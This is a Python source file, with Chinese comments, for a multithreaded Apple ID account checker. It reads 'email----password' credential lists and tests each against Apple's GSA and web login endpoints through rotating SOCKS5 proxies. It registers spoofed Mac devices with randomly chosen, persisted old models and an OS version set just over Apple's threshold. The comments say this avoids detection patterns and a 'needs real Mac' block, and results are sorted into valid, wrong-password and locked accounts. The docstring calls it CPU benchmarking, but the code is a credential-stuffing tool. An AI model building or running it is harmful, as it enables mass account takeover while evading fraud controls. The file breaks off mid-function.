#!/usr/bin/env python3
"""极简线程模型：一个线程 = 一条 IP + 一台设备 + 一条长连接，跑完配额就退出。

共享 IP 池按低/高水位预热与补货；工作线程只从池中取还代理。
目的只有一个：量清楚"这套流程跑起来到底吃多少 CPU"。

每个线程做的事：
    1. 从按水位补货的共享 IP 池领取代理
    2. 建 SOCKS5 + TLS（requests.Session，keep-alive）
    3. 注册一台设备（fetch_headers registered=False，只做一次）
    4. 循环：取一个账号 → 向该设备领一个公共头(OTP) → 用同一条连接验证

用法：
    python3 simple.py --threads 50 --limit 200
    python3 simple.py --threads 50 --limit 200 --no-register   # 复用已注册设备
"""
from __future__ import annotations

import argparse
import json
import os
import queue
import random
import re
import statistics
import sys
import threading
import time
import urllib.request


SHUFFLE_SEED = 20261125


def ensure_open_file_limit(threads, resource_module=None):
    """Raise launchd's tiny descriptor limit before opening network sockets.

    macOS launchd jobs default to a soft RLIMIT_NOFILE of 256. A 1000-thread
    run reaches that ceiling during the first connection wave; getaddrinfo then
    surfaces the underlying EMFILE as a misleading NameResolutionError. Keep
    the hard limit unchanged and request enough descriptors for the workers.
    """
    if resource_module is None:
        try:
            import resource as resource_module
        except ImportError:
            return None
    soft, hard = resource_module.getrlimit(resource_module.RLIMIT_NOFILE)
    wanted = max(4096, max(1, int(threads)) * 8)
    infinity = getattr(resource_module, 'RLIM_INFINITY', -1)
    target = wanted if hard == infinity else min(wanted, hard)
    if soft < target:
        resource_module.setrlimit(resource_module.RLIMIT_NOFILE, (target, hard))
        soft = target
    return int(soft)


def anisette_concurrency_limit(threads, configured=0, proxied=False):
    """Keep full concurrency unless the operator explicitly sets a limit."""
    threads = max(1, int(threads))
    configured = int(configured or 0)
    if configured > 0:
        return min(threads, configured)
    return threads


def startup_worker_batches(total, batch_size=64, pilot_size=8):
    """Return a tiny pilot followed by full-concurrency ramp batches.

    Cold-starting hundreds of provider requests at exactly the same instant
    delays the first visible result.  The pilot proves the public-header path
    first; later batches still reach every requested worker.
    """
    total = max(0, int(total))
    batch_size = max(1, int(batch_size))
    pilot_size = min(total, max(1, int(pilot_size)))
    if not total:
        return []
    batches = [range(0, pilot_size)]
    batches.extend(range(start, min(total, start + batch_size))
                   for start in range(pilot_size, total, batch_size))
    return batches


def anisette_retry_delay(previous, jitter=None):
    """Stagger a direct provider retry so a transient outage cannot stampede."""
    if jitter is None:
        jitter = random.uniform(0.0, 0.5)
    return min(4.0, 2.0 ** max(0, int(previous))) + float(jitter)


def histogram_value_at(histogram, index):
    """Return the value at a zero-based rank in an integer-ms histogram."""
    total = sum(max(0, int(count)) for count in histogram.values())
    if total <= 0:
        return None
    index = max(0, min(int(index), total - 1))
    seen = 0
    for value, count in sorted((int(value), int(count))
                               for value, count in histogram.items()):
        seen += max(0, count)
        if index < seen:
            return value
    return None


def histogram_median(histogram):
    """Exact median without expanding all observations into a large list."""
    total = sum(max(0, int(count)) for count in histogram.values())
    if total <= 0:
        return None
    left = histogram_value_at(histogram, (total - 1) // 2)
    right = histogram_value_at(histogram, total // 2)
    return (left + right) / 2


def wait_for_proxy_when_tasks_remain(pending, stopped=False):
    """A temporary empty proxy pool must not retire a worker with queued work."""
    return int(pending) > 0 and not bool(stopped)


def wait_for_ready_device(pool, condition, stop, pending, timeout=0.5):
    """Lease only a fully registered device published by a producer.

    Business workers never reserve an unregistered slot.  Registration
    producers publish completed devices into ``pool`` and notify this
    condition; the timeout is only a lost-wakeup safeguard.
    """
    while not stop.is_set() and pending() > 0:
        lease = pool.acquire_ready_worker_slot()
        if lease is not None:
            return lease
        with condition:
            condition.wait(max(0.01, float(timeout)))
    return None


def _new_state_lock():
    """Return a queued mutex so the once-per-second live writer cannot starve.

    ``threading.Lock`` does not define which waiter is woken.  With hundreds of
    hot workers it can repeatedly favor a new result update over the live
    writer.  ``Semaphore(1)`` uses the condition wait queue while preserving the
    same context-manager API and mutual-exclusion semantics.
    """
    return threading.Semaphore(1)


def _shared_device_info(pool, profile, cache, gate, timeout, *, proxy=None,
                        provider_direct=False):
    """Return process-local client info without a file-lock stampede.

    The normal fixed device profile already contains both fields required by
    anisette, so it does not need ``DevicePool.info()`` at all.  In the
    ``--no-fix-os`` path, exactly one worker populates the process cache and the
    remaining workers reuse it instead of queueing on ``.info.lock``.
    """
    if profile:
        return {'client_info': profile['client_info'],
                'user_agent': profile['user_agent']}
    with gate:
        if cache:
            return dict(cache)
        value = pool.info(timeout, proxy=proxy, provider_direct=provider_direct)
        cache.update(value)
        return dict(value)


def _proxy_host(proxy):
    """Return a credential-free endpoint label while preserving its port.

    Supplier gateway hosts expose independent proxy exits on different ports,
    so hiding the port made unrelated endpoints look identical in diagnostics.
    """
    if not proxy:
        return ''
    try:
        parsed = urllib.parse.urlsplit(str(proxy))
        host = parsed.hostname or ''
        if ':' in host and not host.startswith('['):
            host = f'[{host}]'
        return f'{host}:{parsed.port}' if parsed.port is not None else host
    except (TypeError, ValueError):
        return str(proxy).split('@')[-1]


def load_accounts(path, limit, shuffle=True):
    rows = [l.strip() for l in open(path, encoding='utf-8', errors='replace')
            if l.strip() and '----' in l]
    if shuffle:
        # 固定种子：多进程各自按 offset 切片时必须看到完全相同的顺序，
        # 否则切片互相重叠，会重复验证同一批账号、漏掉另一批。
        import random
        random.Random(SHUFFLE_SEED).shuffle(rows)
    if limit:
        rows = rows[:limit]
    out = []
    for line in rows:
        email, _, password = line.partition('----')
        out.append((email.strip(), password.strip()))
    return out


def proxy_alive(proxy, timeout=8.0):
    """探活：经 SOCKS5 打一次 GET，**必须用系统 CA 正常校验**。

    关掉校验只能掩盖 TLS 链路本身的问题，会把"证书都不对"的出口当成好出口。
    """
    import requests
    session = requests.Session()
    session.trust_env = False
    try:
        session.get('https://gsa.apple.com/',
                    proxies={'http': proxy, 'https': proxy},
                    timeout=(timeout, timeout), verify=True, allow_redirects=False)
        return True
    except Exception:                                              # noqa: BLE001
        return False
    finally:
        session.close()


def web_auth_type(web, trace=None):
    """取 Web 完成阶段的 authType。

    idmsa 的安全结果不带 auth_type，该字段只在 trace.complete
    里返回；兼容测试或旧实现直接放在结果中的情况。
    """
    web = web if isinstance(web, dict) else {}
    trace = trace if isinstance(trace, dict) else {}
    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
    return str(complete.get('auth_type') or web.get('auth_type') or '').strip().casefold()


def classify_web_method(web, trace=None):
    """把 au=repair 的 web 响应细化成具体流程。

    对应 cluster-lab 的 _repair_probe_method：
      verification_code  — 确实是验证码挑战
      security_repair    — 安全修复流程，不是验证码
      repair_unspecified — 还是说不清
    """
    web = web if isinstance(web, dict) else {}
    status = str(web.get('status') or '').strip().casefold()
    auth = web_auth_type(web, trace)
    if status == 'need_2fa' and auth in ('hsa', 'hsa2'):
        return 'verification_code'
    if auth in ('sa', 'non-sa', 'dnu') or status == 'needs_setup':
        return 'security_repair'
    return 'repair_unspecified'


def refine_repair_web_status(gsa_status, web, trace=None):
    """仅在 Web 完成 SRP 后明确证明密码时改归“密码正确”。"""
    web = web if isinstance(web, dict) else {}
    auth = web_auth_type(web, trace)
    status = str(web.get('status') or '').strip().casefold()
    if auth in ('sa', 'non-sa') and status in ('valid', 'needs_setup'):
        return 'valid'
    return gsa_status


# 只有这些原因值得换环境重试；明确结论（密码错/锁定/不存在/双重验证）绝不重试
RETRY_HTTP0 = 'http0'        # 连不上 → 换 IP
RETRY_5XX = '5xx'            # 502/503/504 → 换 IP
RETRY_ENV = 'env'            # -22421 设备环境异常 → 换 IP + 换公共头
RETRY_TIMEOUT = 'timeout'    # 超时 → 换 IP
RETRY_NONE = None


# Apple 对部分账号要求"必须用真 Mac 登录"，GSA 通道满足不了，不重试也不改判
EC_NEED_MAC = -23782

# anisette 服务（sidestore 等）注册时写死 macOS 10.12.6，低于 Apple 门槛 10.13，
# 对高风险账号直接回 -23782。正确做法是**注册时就把型号报给它**（同 cluster-lab），
# 不是事后改回包头：型号、系统、UA 三者要自洽，且同一台设备必须永远一致。
# 这里用 10.13.6 + 2013-2016 老机型——刚好过线，且这套组合本来就能跑该版本。
_OS = 'Mac OS X;10.13.6;17G65'
_UA = 'akd/1.0 CFNetwork/902.2 Darwin/17.7.0'
_KIT = '<com.apple.AuthKit/1 (com.apple.akd/1.0)>'
DEVICE_MODELS = (
    'MacBookPro11,1', 'MacBookPro11,2', 'MacBookPro11,3', 'MacBookPro11,4', 'MacBookPro11,5',
    'MacBookPro12,1', 'MacBookPro13,1', 'MacBookPro13,2', 'MacBookPro13,3',
    'MacBookPro14,1', 'MacBookPro14,2', 'MacBookPro14,3',
    'MacBookAir6,1', 'MacBookAir6,2', 'MacBookAir7,1', 'MacBookAir7,2',
    'iMac14,1', 'iMac14,2', 'iMac14,3', 'iMac14,4', 'iMac15,1', 'iMac16,1', 'iMac16,2', 'iMac17,1',
    'Macmini7,1', 'MacPro6,1',
)


def device_profile(pool, slot):
    """注册时随机挑型号并落盘，之后这台设备永远报同一个（同 cluster-lab 做法）。

    随机是为了避免"槽位 1 永远是 MacBookPro11,1"这种规律；
    落盘是为了同一台设备不会一会儿报 MacBook、一会儿报 iMac——那比型号单调更可疑。
    """
    try:
        path = pool.slot_directory(slot) / 'device-profile.json'
    except Exception:                                              # noqa: BLE001
        path = None
    if path is not None and path.exists():
        try:
            data = json.loads(path.read_text(encoding='utf-8'))
            if isinstance(data, dict) and data.get('client_info') and data.get('user_agent'):
                return data
        except (OSError, ValueError):
            pass
    model = random.SystemRandom().choice(DEVICE_MODELS)
    profile = {'model': model,
               'client_info': f'<{model}> <{_OS}> {_KIT}',
               'user_agent': _UA}
    if path is not None:
        try:
            path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
            fd = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
            with os.fdopen(fd, 'w', encoding='utf-8') as handle:
                handle.write(json.dumps(profile, ensure_ascii=False))
        except (FileExistsError, OSError):
            try:
                return json.loads(path.read_text(encoding='utf-8'))
            except (OSError, ValueError):
                pass
    return profile


def refine_status(result, bucket):
    """在 result_bucket 之上补一个明确的分类：-23782 = 需要真机。"""
    try:
        ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        return bucket
    if ec == EC_NEED_MAC:
        return 'need_mac'
    return bucket


def retry_kind(result, bucket):
    """判断这次结果要不要重试，以及该换什么。

    返回 (kind, summary)：
      RETRY_HTTP0 / RETRY_5XX / RETRY_TIMEOUT → 换 IP 再来
      RETRY_ENV                               → 换 IP 且换公共头
      RETRY_NONE                              → 结果明确，不重试
    """
    if bucket in ('wrong_password', 'locked', 'security_lock',
                  'not_found', 'valid', 'need_2fa', 'need_mac'):
        return RETRY_NONE, ''                    # 明确结论，重试没意义
    try:
        http = int(result.get('http') or 0)
    except (TypeError, ValueError):
        http = 0
    try:
        ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        ec = None
    if ec == -22421:
        return RETRY_ENV, f'ec={ec}'
    if http == 0:
        return RETRY_HTTP0, 'http=0'
    if http in (500, 502, 503, 504):
        return RETRY_5XX, f'http={http}'
    if bucket == 'timeout':
        return RETRY_TIMEOUT, f'http={http}'
    return RETRY_NONE, ''


def finalize_retry_exhausted(result):
    """Turn Apple's ambiguous account-information reason into the final verdict."""
    from fastcheck.status import account_information_incorrect
    if account_information_incorrect(result):
        result['retry_exhausted'] = 'account_information_incorrect'
        result['status'] = 'wrong_password'
    return result


def local_exception_used_proxy(gsa_started, anisette_proxy):
    """Whether a caught local network error proves the current proxy failed.

    Direct Anisette/OTP requests do not traverse the task proxy. Their DNS or
    provider failures must not drain the IP pool.
    """
    return bool(gsa_started or anisette_proxy)


def local_exception_result(exc):
    """Turn a caught local exception into a safe, classifiable result.

    Network exception messages can contain proxy credentials or request data, so
    only exception class names are persisted.  Transport failures are explicit
    timeouts and therefore enter the normal retry path; programming errors stay
    undetermined but retain a useful class name instead of becoming a blank row.
    """
    pending, seen, names = [exc], set(), []
    while pending and len(seen) < 12:
        value = pending.pop()
        if not isinstance(value, BaseException) or id(value) in seen:
            continue
        seen.add(id(value))
        names.append(type(value).__name__)
        pending.extend((value.__cause__, value.__context__))
        pending.extend(arg for arg in value.args if isinstance(arg, BaseException))
        reason = getattr(value, 'reason', None)
        if isinstance(reason, BaseException):
            pending.append(reason)
    names = names or ['Exception']
    joined = ' '.join(names).casefold()
    transient = any(token in joined for token in (
        'timeout', 'connection', 'proxy', 'socket', 'ssl', 'tls', 'urlerror',
        'remote', 'eof', 'brokenpipe', 'network', 'websocket', 'http',
    ))
    result = {
        'status': 'timeout' if transient else 'error',
        'kind': names[0],
        'stage': 'local',
        'detail': ('本地链路异常: ' if transient else '本地程序异常: ')
                  + ' <- '.join(names[:4]),
    }
    if transient:
        result['http'] = 0
    return result


def classify_web(web, trace=None):
    """web(idmsa) 的 detail 是中文，不能走英文关键词匹配，直接看 ec。"""
    trace = trace if isinstance(trace, dict) else {}
    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
    latest = complete or (trace.get('init') if isinstance(trace.get('init'), dict) else {})
    try:
        ec = int(web.get('apple_ec'))
    except (TypeError, ValueError):
        ec = None
    try:
        http = int(latest.get('http') or web.get('http') or 0)
    except (TypeError, ValueError):
        http = 0
    if ec == -20209:
        return 'security_lock'      # 账户已锁定（与 GSA 的 locked 对应）
    if ec == -20101:
        return 'wrong_password'     # 账户信息不正确
    if ec in (-20970,):
        return 'not_found'
    if ec == -22421 or http in (500, 502, 503, 504):
        return 'web_unavailable'    # 链路/前置层拒绝，不代表账号状态
    if http == 0:
        return 'web_timeout'
    return str(web.get('status') or 'error')


def web_retryable(status):
    """只有 Web 补充请求的真实链路故障才需要换出口。"""
    return status in ('web_timeout', 'web_unavailable')


def fetch_usable_ip(api, timeout=8.0, attempts=4):
    for _ in range(attempts):
        proxy = fetch_one_ip(api)
        if proxy and proxy_alive(proxy, timeout):
            return proxy
    return None


def fetch_one_ip(api):
    """领一条 IP。失败返回 None，由调用方重试。"""
    try:
        with urllib.request.urlopen(api.format(num=1), timeout=20) as resp:
            body = resp.read().decode('utf-8', 'replace')
    except Exception:
        return None
    for line in body.splitlines():
        line = line.strip()
        if line and ':' in line and not line.startswith('{'):
            # 供应商返回的是 SOCKS5 端口：必须显式声明协议，
            # 否则 requests 会补成 http:// 去发 CONNECT，服务器直接断开。
            return line if '://' in line else f'socks5h://{line}'
    return None


def proxy_api_default():
    """凭据不进源码：优先环境变量，其次 secrets.json，最后 conf.json。"""
    env = os.environ.get('GSA_PROXY_API')
    if env:
        return env
    for name in ('secrets.json', 'conf.json'):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        try:
            with open(path, encoding='utf-8') as handle:
                value = json.load(handle).get('proxy_api')
            if isinstance(value, str) and '{num}' in value:
                return value
        except (OSError, ValueError):
            continue
    return ''


def final_progress_fields(results):
    """Copy authoritative terminal counters out of mutable worker state."""
    return {'by_status': dict(results.get('by_status') or {}),
            'recent': list(results.get('recent') or [])}


def write_startup_live(path, startup, **fields):
    """Atomically publish startup progress before the regular live writer exists."""
    payload = {
        'started': time.strftime('%H:%M:%S'), 'elapsed': 0,
        'total': 0, 'done': 0, 'rate': 0, 'per_hour': 0, 'eta': None,
        'threads': 0, 'processes': 1, 'backend': None, 'engine': 'threading',
        'cpu_seconds': 0, 'cpu_cores': 0, 'cpu_per_account': 0,
        'by_status': {}, 'recent': [], 'finished': False,
        'startup': dict(startup or {}),
    }
    payload.update(fields)
    target = os.path.abspath(path)
    os.makedirs(os.path.dirname(target) or '.', exist_ok=True)
    tmp = target + '.startup.tmp'
    with open(tmp, 'w', encoding='utf-8') as handle:
        json.dump(payload, handle, ensure_ascii=False)
    os.replace(tmp, target)


class ProcessDeviceHeaderCache:
    """Short-lived public headers bound to one process-owned device slot."""

    def __init__(self, clock=time.monotonic):
        self.clock = clock
        self.lock = threading.Lock()
        self.entries = {}

    def take(self, slot, reuse):
        if int(reuse) <= 0:
            return None
        with self.lock:
            entry = self.entries.get(int(slot))
            if (not entry or entry['expires'] <= self.clock()
                    or entry['used'] >= int(reuse)):
                self.entries.pop(int(slot), None)
                return None
            entry['used'] += 1
            return dict(entry['headers'])

    def bind_used(self, slot, headers, ttl, reuse):
        if int(reuse) <= 0:
            return
        with self.lock:
            self.entries[int(slot)] = {
                'headers': dict(headers), 'used': 1,
                'expires': self.clock() + max(1.0, float(ttl)),
            }

    def invalidate(self, slot):
        with self.lock:
            self.entries.pop(int(slot), None)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--accounts', default='/Users/xxx/Downloads/测试.txt')
    ap.add_argument('--api', default=proxy_api_default())
    ap.add_argument('--fastcheck', default='',
                    help='fastcheck 所在目录；留空则用包内自带的 fastcheck/')
    ap.add_argument('--device-root', default='./data/devices-simple')
    ap.add_argument('--device-slots', default=None,
                    help='本进程独占槽位，逗号分隔；未传=加载全部，- = 空分组')
    ap.add_argument('--new-slot-start', type=int, default=0, dest='new_slot_start',
                    help='本进程注册新设备时的首个槽位')
    ap.add_argument('--new-slot-step', type=int, default=1, dest='new_slot_step',
                    help='本进程新增槽位步长（多进程时避免重叠）')
    ap.add_argument('--threads', type=int, default=50)
    ap.add_argument('--limit', type=int, default=0, help='0=全部')
    ap.add_argument('--offset', type=int, default=0, help='从第几条账号开始（多进程切分用）')
    ap.add_argument('--slot-base', type=int, default=0, dest='slot_base',
                    help='设备槽位基址，多进程时各进程不重叠')
    ap.add_argument('--timeout', type=float, default=25.0)
    ap.add_argument('--retries', type=int, default=0,
                    help='协议内重试（同一 IP 同一公共头），一般留 0')
    ap.add_argument('--no-fix-os', action='store_true', dest='no_fix_os',
                    help='不覆盖 macOS 10.12 的设备头（默认会覆盖成 14.0，避免 -23782）')
    ap.add_argument('--item-timeout', type=float, default=40.0, dest='item_timeout',
                    help='单条账号的墙钟总预算（含所有重试），超了就判超时放弃')
    ap.add_argument('--retry', type=int, default=2, dest='retry',
                    help='外层重试：http=0 / 5xx / -22421 时换 IP 重来（0=不重试）')
    ap.add_argument('--no-register', action='store_true')
    ap.add_argument('--register-workers', type=int, default=0,
                    help='并发注册设备数上限，0=每个工作线程可独立注册')
    ap.add_argument('--anisette-workers', type=int, default=0,
                    help='并发请求公共头的上限，0=跟随本进程线程数（不额外限制）')
    ap.add_argument('--verify-web', action='store_true', dest='verify_web',
                    help='GSA 返回 au=repair 时，用 web 协议(idmsa)细分一次')
    ap.add_argument('--web-timeout', type=float, default=10.0, dest='web_timeout')
    ap.add_argument('--no-client-cache', action='store_true',
                    help='关闭 Client 复用（每条都新建，用于对照）')
    ap.add_argument('--anisette-proxy', action='store_true',
                    help='公共头也走代理（机房 IP 直连 sidestore 被墙时必须开）')
    ap.add_argument('--anisette-timeout', type=float, default=20.0,
                    dest='anisette_timeout',
                    help='anisette 单次请求超时；连不上时会快速失败')
    ap.add_argument('--register-timeout', type=float, default=20.0,
                    dest='register_timeout',
                    help='设备初始化总超时；预算内退避重试，耗尽后账号记为超时')
    ap.add_argument('--device-max-uses', type=int, default=100,
                    dest='device_max_uses',
                    help='每台设备最多完成多少条账号；达到后销毁并注册新设备，0=不限')
    ap.add_argument('--per-ip', type=int, default=1,
                    help='一条 IP 跑多少条账号（1=每个任务换新 IP，走 IP 池 rotate）')
    ap.add_argument("--otp-reuse", type=int, default=15, dest="otp_reuse",
                    help='一个公共头能验多少条账号（实测 15-20 安全，0=每条都换）')
    ap.add_argument('--ip-ttl', type=float, default=50.0, help='单条 IP 可用秒数（供应商 60 秒）')
    ap.add_argument('--ip-batch', type=int, default=1000, help='单次最多拉多少条')
    ap.add_argument('--ip-interval', type=float, default=1.0, help='supplier 补货检查间隔秒（1 秒一次补）')
    ap.add_argument('--no-ip-pool', action='store_true', help='关掉池，回到每线程自取')
    ap.add_argument('--no-precheck', action='store_true')
    ap.add_argument('--precheck-timeout', type=float, default=8.0)
    ap.add_argument('--out', default='./data/simple-run.jsonl')
    ap.add_argument('--live', default='./data/live.json', help='实时状态文件，供页面读取')
    args = ap.parse_args()
    startup_started = time.monotonic()
    startup_state = {
        'phase': 'device_scan', 'message': '正在扫描持久化设备',
        'process_ready': 1, 'process_total': 1,
        'device_discovered': 0, 'device_loaded': 0,
        'device_ready': 0, 'device_target': max(0, int(args.threads)),
        'device_registering': 0,
        'proxy_target': 0, 'proxy_fetched': 0, 'proxy_available': 0,
        'proxy_api_calls': 0, 'proxy_round': 0,
        'public_header_retries': 0,
    }

    def publish_startup(phase=None, message=None, **updates):
        if phase is not None:
            startup_state['phase'] = phase
        if message is not None:
            startup_state['message'] = message
        startup_state.update(updates)
        startup_state['elapsed'] = round(time.monotonic() - startup_started, 1)
        write_startup_live(
            args.live, startup_state, threads=args.threads,
            accounts=args.accounts, elapsed=startup_state['elapsed'])

    publish_startup()
    nofile_limit = ensure_open_file_limit(args.threads)

    _here = os.path.dirname(os.path.abspath(__file__))
    _local = os.path.join(_here, 'fastcheck')
    if os.path.isdir(_local):
        sys.path.insert(0, _here)            # 让 import fastcheck 命中包内的
    elif args.fastcheck and os.path.isdir(args.fastcheck):
        sys.path.insert(0, args.fastcheck)
    else:
        raise SystemExit(
            f'找不到 fastcheck 模块。应放在 {_local}，'
            f'或用 --fastcheck 指定目录')
    from fastcheck.protocols import gsa_status as gs
    from fastcheck.devices import (DevicePool, count_registered_devices,
                                   registered_device_slots)
    from fastcheck.protocols.srp_auth import SRP_MATH_BACKEND
    from fastcheck.status import result_bucket

    assigned_slots = []
    if args.device_slots is None:
        assigned_slots = registered_device_slots(
            args.device_root, 'https://new.ani.sidestore.io')
    elif args.device_slots.strip() not in ('', '-'):
        assigned_slots = [int(value) for value in args.device_slots.split(',')
                          if value.strip() and int(value) > 0]
    publish_startup(
        'device_load', '正在读取已注册设备',
        device_discovered=len(assigned_slots))
    new_slot_start = int(args.new_slot_start or 0)
    if new_slot_start <= 0:
        new_slot_start = max(assigned_slots or [args.slot_base]) + 1
    # Each process owns its assigned slots and loads them into memory once.
    # New slot sequences are disjoint when run_mp supplies a step > 1.
    device_pool = DevicePool(
        args.device_root, 'https://new.ani.sidestore.io',
        max_devices=max(args.slot_base + args.threads, new_slot_start,
                        *(assigned_slots or [1])), in_memory=True,
        worker_use_limit=args.device_max_uses)
    loaded_devices = device_pool.configure_worker_slots(
        assigned_slots, new_slot_start=new_slot_start,
        new_slot_step=args.new_slot_step)
    publish_startup(device_loaded=loaded_devices, device_ready=loaded_devices)

    os.makedirs(os.path.dirname(args.out) or '.', exist_ok=True)
    if args.offset or args.limit:
        # 先全部读出来再切，保证多进程切分不重叠
        full = load_accounts(args.accounts, 0)
        start = max(0, int(args.offset))
        rows = full[start:start + args.limit] if args.limit else full[start:]
    else:
        rows = load_accounts(args.accounts, 0)
    startup_device_target = min(max(0, len(rows)), max(1, args.threads))
    publish_startup(
        'proxy_fetch', '正在预热代理 IP', total=len(rows),
        device_target=startup_device_target)
    print(f'账号 {len(rows)} 条（offset={args.offset}）| 线程 {args.threads} '
          f'| 本进程设备 {loaded_devices} 台 | 新槽位 {new_slot_start} '
          f'步长 {max(1, args.new_slot_step)} | SRP {SRP_MATH_BACKEND}')
    if nofile_limit is not None:
        print(f'文件描述符上限 {nofile_limit}')
    if SRP_MATH_BACKEND != 'gmpy2':
        print('  警告：gmpy2 未生效，SRP 单次约 9.8ms 而不是 2.2ms')

    _aw = int(args.anisette_workers)
    anisette_limit = anisette_concurrency_limit(
        args.threads, _aw, proxied=args.anisette_proxy)
    anisette_gate = threading.Semaphore(anisette_limit)
    print(f'公共头并发上限 {anisette_limit}'
          f'{"（自动）" if _aw <= 0 else ""}')
    ip_pool = None
    if not args.no_ip_pool:
        from gsafast.ippool import IpPool
        ip_pool = IpPool(args.api, threads=args.threads, ttl=args.ip_ttl,
                         per_ip=args.per_ip, batch=args.ip_batch,
                         refill_interval=args.ip_interval,
                         rotate=(args.per_ip <= 1))
        proxy_target = min(ip_pool.initial_max, int(ip_pool.threads * 2))
        publish_startup(proxy_target=proxy_target)

        def proxy_warm_progress(progress):
            fetched = int(progress.get('fetched') or 0)
            publish_startup(
                'proxy_fetch',
                f'正在拉取代理 IP（{fetched}/{int(progress.get("target") or proxy_target)}）',
                proxy_target=int(progress.get('target') or proxy_target),
                proxy_fetched=fetched, proxy_available=fetched,
                proxy_api_calls=int(progress.get('api_calls') or 0),
                proxy_round=int(progress.get('round') or 0),
                proxy_last_fetch_ms=progress.get('last_fetch_ms'))

        warmed = ip_pool.warm(extra=1, progress=proxy_warm_progress)
        ip_pool.start()
        publish_startup(
            'device_register', '代理池就绪，正在准备设备',
            proxy_fetched=warmed, proxy_available=warmed)
        print(f'IP 池: 预热 {warmed} 条（每线程先分 1 条，其余共享） '
              f'ttl={args.ip_ttl:.0f}s 单次上限={args.ip_batch}')
    else:
        publish_startup(
            'device_register', '未启用代理池，正在准备设备',
            proxy_target=0, proxy_fetched=0, proxy_available=0)

    # 设备与公共头准备好之前不分配账号。共享队列仅在真正准备发业务
    # 请求时弹出一条，因此注册等待/失败不会污染任何账号结果。
    import collections
    task_queue = collections.deque(rows)
    task_queue_lock = threading.Lock()
    active_workers = min(max(0, len(rows)), max(1, args.threads))
    missing_devices = max(0, active_workers - loaded_devices)
    print(f'账号进入共享待领队列 {len(rows)} 条；启动 {active_workers} 个工作线程；'
          f'缺设备线程自行注册 {0 if args.no_register else missing_devices} 台')

    def pending_task_count():
        with task_queue_lock:
            return len(task_queue)

    def take_task():
        with task_queue_lock:
            return task_queue.popleft() if task_queue else None
    lock = _new_state_lock()
    sink_lock = threading.Lock()       # 结果落盘不占用状态锁
    budget_lock = threading.Lock()     # 预算日志有独立的 I/O 锁
    info_gate = threading.Lock()       # 全进程只获取一次 anisette 客户端信息
    info_cache = {}
    sink = open(args.out, 'w', encoding='utf-8')
    write_buffer = []          # 攒够再落盘，避免每条都 fsync
    worker_leases = {}         # tid -> process-local in-memory device claim
    device_headers = ProcessDeviceHeaderCache()
    # 预算耗尽专用日志：每条 budget_hit 一行，含 OTP/每跳耗时拆解，方便单独分析
    budget_sink = open(os.path.splitext(args.out)[0] + '-budget.jsonl', 'w', encoding='utf-8')
    started = time.perf_counter()
    wall_started = time.time()
    proc_cpu_start = time.process_time()
    main_cpu0 = time.thread_time()      # 主线程 CPU（写盘、序列化都在这里）
    results = {'done': 0, 'cpu': 0.0, 'by_status': {}, 'per_thread_cpu': [],
               'per_thread_count': [], 'samples': [], 'ip_fail': 0,
               'latency_hist': {},
               'total': len(rows), 'expected': len(rows), 'started': started,
               'recent': collections.deque(maxlen=12),
               'device_ready': set(), 'device_in_use': set(),
               'device_registering': set(), 'register_errors': 0,
               'register_error_types': {}, 'device_retired': 0,
               'workers_started': 0, 'public_header_waiting': 0,
               'public_header_ready': 0, 'public_header_retries': 0}
    stop = threading.Event()
    first_result = threading.Event()
    first_public_header = threading.Event()
    device_pool_cv = threading.Condition()
    device_inventory = {'ready': loaded_devices, 'registering': 0}
    startup_runtime_lock = threading.Lock()
    startup_runtime = {
        'workers_started': 0, 'public_header_waiting': 0,
        'public_header_ready': 0, 'public_header_retries': 0,
    }

    SAMPLE_CAP = 4000          # 历史样本上限，超出只保留最近的一批

    def live_writer():
        """每秒把当前进度写成 JSON。分位数只在 done 变化时重算。"""
        wcpu0 = time.thread_time()
        path = args.live
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        cached = {'done': -1, 'p50': None, 'p90': None}
        while not stop.is_set():
            with lock:
                done = results['done']
                elapsed = time.perf_counter() - started
                by_status = dict(results['by_status'])
                cpu = results['cpu']
                recent = list(results['recent'])
                device_in_use = len(results['device_in_use'])
                device_registering = len(results['device_registering'])
                workers_started = results.get('workers_started', 0)
                public_header_waiting = results.get('public_header_waiting', 0)
                public_header_ready = results.get('public_header_ready', 0)
                public_header_retries = results.get('public_header_retries', 0)
                register_errors = results['register_errors']
                register_error_types = dict(results['register_error_types'])
                latency_hist = dict(results['latency_hist'])
                samples = results['samples']
                if len(samples) > SAMPLE_CAP:
                    del samples[:-SAMPLE_CAP]
                if done != cached['done']:                      # 只有新增结果才重算
                    count = sum(latency_hist.values())
                    median = histogram_median(latency_hist)
                    cached['p50'] = round(median) if median is not None else None
                    cached['p90'] = histogram_value_at(
                        latency_hist, int(count * .9)) if count else None
                    cached['done'] = done
            # “已注册”是磁盘上持久化且完成注册的设备总数，不是
            # 本轮已完成初始化的工作线程数。
            device_registered = count_registered_devices(
                args.device_root, 'https://new.ani.sidestore.io')
            with device_pool_cv:
                inventory_ready = int(device_inventory['ready'])
                inventory_registering = int(device_inventory['registering'])
            pool_snapshot = ip_pool.snapshot() if ip_pool is not None else None
            startup_snapshot = dict(startup_state)
            startup_snapshot.update({
                'elapsed': round(elapsed, 1),
                'device_loaded': loaded_devices,
                'device_ready': inventory_ready,
                'device_target': active_workers,
                'device_registering': inventory_registering,
                'device_in_use': device_in_use,
                'workers_started': workers_started,
                'public_header_waiting': public_header_waiting,
                'public_header_ready': public_header_ready,
                'public_header_retries': public_header_retries,
                'public_header_limit': anisette_limit,
            })
            if pool_snapshot is not None:
                startup_snapshot.update({
                    'proxy_fetched': int(pool_snapshot.get('fetched') or 0),
                    'proxy_available': int(pool_snapshot.get('available') or 0),
                    'proxy_api_calls': int(pool_snapshot.get('api_calls') or 0),
                })
            if done:
                startup_snapshot.update(
                    phase='running', message='业务校验已开始')
            elif workers_started:
                startup_snapshot.update(
                    phase='public_header',
                    message=(f'正在获取公共头（就绪 {public_header_ready}/'
                             f'{workers_started}，并发上限 {anisette_limit}）'))
            elif active_workers and inventory_ready < active_workers:
                startup_snapshot.update(
                    phase='device_register',
                    message=f'正在准备设备（{inventory_ready}/{active_workers}）')
            else:
                startup_snapshot.update(
